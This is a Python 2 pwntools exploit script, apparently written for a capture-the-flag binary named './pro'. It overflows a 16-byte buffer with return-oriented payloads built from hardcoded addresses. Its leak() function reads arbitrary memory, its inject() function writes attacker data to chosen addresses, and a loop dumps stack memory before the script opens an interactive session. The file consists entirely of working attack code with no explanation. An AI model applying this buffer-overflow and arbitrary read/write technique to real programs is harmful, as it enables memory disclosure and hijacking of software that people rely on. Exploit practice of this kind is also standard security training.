# -*- coding: utf-8 -*-

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

Io = process("./pro")

ret_addr = 0x080480F8
input_function_without_args = 0x080480E1
output_function_without_args = 0x080480F9
init_function = 0x0804811E
start_addr = 0x080480B8
stack_start_addr = 0xff8c7000
base_addr = 0x08048000

# gdb.attach(proc.pidof(Io)[0], gdbscript='b %s\n' % (input_function_without_args))
junk = "A" * 0x10

def leak(addr, length):
    payload = flat([
        junk,
        p32(output_function_without_args),
        p32(start_addr),
        p32(0x1),
        p32(addr),
        p32(length),
    ])
    Io.send(payload)
    data = Io.read().split("Good Luck!\n")[1]
    print "[0x%x] => [%r]" % (addr, data)
    return data

def inject(addr, data):
    payload = flat([
        junk,
        p32(input_function_without_args),
        p32(start_addr),
        p32(0x0),
        p32(addr),
        p32(len(data)),
    ])
    Io.send(payload)
    Io.send(data)

for i in range(0x10):
    leak(stack_start_addr + i * 4, 0x1000)

Io.interactive()
